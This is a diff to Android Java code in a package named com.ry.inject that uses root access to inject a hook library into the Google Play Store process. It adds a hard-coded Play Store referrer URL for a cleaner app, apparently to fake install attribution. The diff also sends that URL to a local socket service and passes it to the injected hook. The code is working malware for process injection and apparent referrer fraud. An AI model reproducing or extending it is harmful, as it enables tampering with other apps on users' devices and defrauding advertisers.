@@ -2,17 +2,22 @@ package com.ry.inject;
 
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 import java.util.Arrays;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 import android.content.Context;
 import android.net.LocalSocket;
 import android.net.LocalSocketAddress;
+import android.text.TextUtils;
+import android.util.Base64;
 import android.util.Log;
 
 /**
@@ -89,6 +94,10 @@ public class JNI {
      	 return (new File("/system/bin/su").canExecute() || new File("/system/xbin/su").canExecute());
 	}
     
+	public static final int startHook(final Context context){
+		return startHook(context, "https://play.google.com/store/apps/details?id=com.quicksys.cleaner&referrer=utm_source%3Dcap%26utm_medium%3Dbanner0512%26utm_term%3D0512");
+	}
+	
     /**
      * @category 启动GP注入执行
      * @param context
@@ -100,8 +109,9 @@ public class JNI {
      * -3:没有权限
      * -4:GP未运行
      * -5:执行异常
+     * -6:没有帐号
      */
-	public synchronized static final int startHook(final Context context) {
+	public synchronized static final int startHook(final Context context, final String url) {
 		final String pack = "com.android.vending";// GP市场
 		// final String pack = "com.google.android.gsf.login";//GP登录
 //		final String pack = "com.android.phone";// 电话服务
@@ -145,14 +155,31 @@ public class JNI {
 			return (-4);
 		}
 		
+		String refAddress;
+		if(TextUtils.isEmpty(url)){
+			refAddress = "";
+		}else{
+			refAddress = url;
+		}
+//		refAddress = new String(Base64.encode(refAddress.getBytes(), 0));
+		refAddress += "\n";
+		
 		//是否已经注册了
 		LocalSocket local = null;
 		try{
 			local = new LocalSocket();
 			local.connect(new LocalSocketAddress("com.gp.modis.service"));
-			byte[] a = RWUtils.read(local.getInputStream());
-			if(a != null && new String(a).contains("OK")){
+			
+			OutputStream out = local.getOutputStream();
+			out.write(refAddress.getBytes());
+			out.flush();
+//			out.close();
+			
+			String res = new String(RWUtils.read(local.getInputStream()));
+			if(res.contains("OK")){
 				return 0;
+			}else if(res.contains("NO")){
+				return (-6);
 			}
 		}catch(Exception e){
 			e.printStackTrace();
@@ -170,7 +197,7 @@ public class JNI {
 		final boolean su = isSuByRoot();
 		if (ppm || ipm || su) {
 			final String cmd = injectPath.getPath() + " " + pack + " "
-					+ hookerPath + " hook_entry hahaha";
+					+ hookerPath + " hook_entry " + refAddress;
 			try {
 				if (ipm) {
 					shell("ipm", cmd);
